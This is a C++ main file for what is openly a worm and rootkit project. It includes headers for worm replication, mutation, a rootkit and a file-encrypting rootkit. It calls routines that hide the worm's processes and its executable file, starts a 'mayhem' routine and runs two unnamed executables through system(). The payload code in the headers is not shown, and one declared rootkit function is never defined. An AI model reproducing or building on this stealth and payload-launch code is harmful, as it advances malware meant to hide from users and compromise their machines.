#include <iostream>
#include <chrono>
#include <thread>
#include <cstdlib> // For system function

#include "eventDrivenWorm.h" // Include the header for WormReplicator class
#include "enigmaticWorm.h" // Include the header for EnigmaticWorm class
#include "mayhem_worm_mutator.h" // Include the header for MayhemWorm class
#include "rootkit_worm.h" // Include the header for Rootkit class
#include "aes_file_encryptor_rootkit.h"

using namespace std;

// Function prototypes
void hideProcesses();
void hideWormFile();
void initiateMayhem();
void startRootkit();
void performAdvancedChecks();

int main() {
    // Perform initialization tasks
    cout << "Initializing..." << endl;

    // Perform tasks
    hideProcesses();
    hideWormFile();
   
 
    initiateMayhem();
 

    // Perform advanced checks
    performAdvancedChecks();

    // Call text.exe
    cout << "Calling text.exe..." << endl;
    system("text.exe");
    system("heeya.exe");

    cout << "Program completed." << endl;
    return 0;
}

// Function to hide processes
void hideProcesses() {
    cout << "Hiding processes..." << endl;
    ProcessHider processHider;
    processHider.HideProcess();
    ProcessEnumerator processEnumerator;
    processEnumerator.HideWormProcess();
}

// Function to hide the worm file
void hideWormFile() {
    cout << "Hiding worm file..." << endl;
    FileHider fileHider;
    fileHider.HideWormFile("C:\\Users\\User\\Documents\\worm.exe");
}



// Function to initiate enigmatic activities


// Function to initiate mayhem
void initiateMayhem() {
    cout << "Initiating mayhem..." << endl;
    MayhemWorm mayhemWorm;
    mayhemWorm.initiateMayhem();
}



// Function to perform advanced checks
void performAdvancedChecks() {
    cout << "Performing advanced checks..." << endl;
    // Simulate a delay for advanced checks
    this_thread::sleep_for(chrono::seconds(10));

    // Additional checks or actions can be added here
}
